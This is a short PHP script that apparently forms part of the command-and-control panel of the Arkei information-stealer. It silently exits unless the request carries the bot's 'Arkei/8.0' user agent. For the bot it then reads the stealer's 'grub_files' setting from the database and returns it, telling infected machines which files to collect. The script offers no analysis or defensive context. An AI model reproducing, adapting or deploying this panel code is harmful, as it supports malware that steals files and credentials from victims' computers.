<?php

error_reporting(0);

if($_SERVER["HTTP_USER_AGENT"] != "Arkei/8.0")
{
	exit(0);
}

require("../app/config.php");

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$get= $database->query("SELECT `Value` FROM `settings` WHERE `Name`='grub_files'")->fetch_array();
	echo $get["Value"];
}
else
{
	exit(0);
}

?>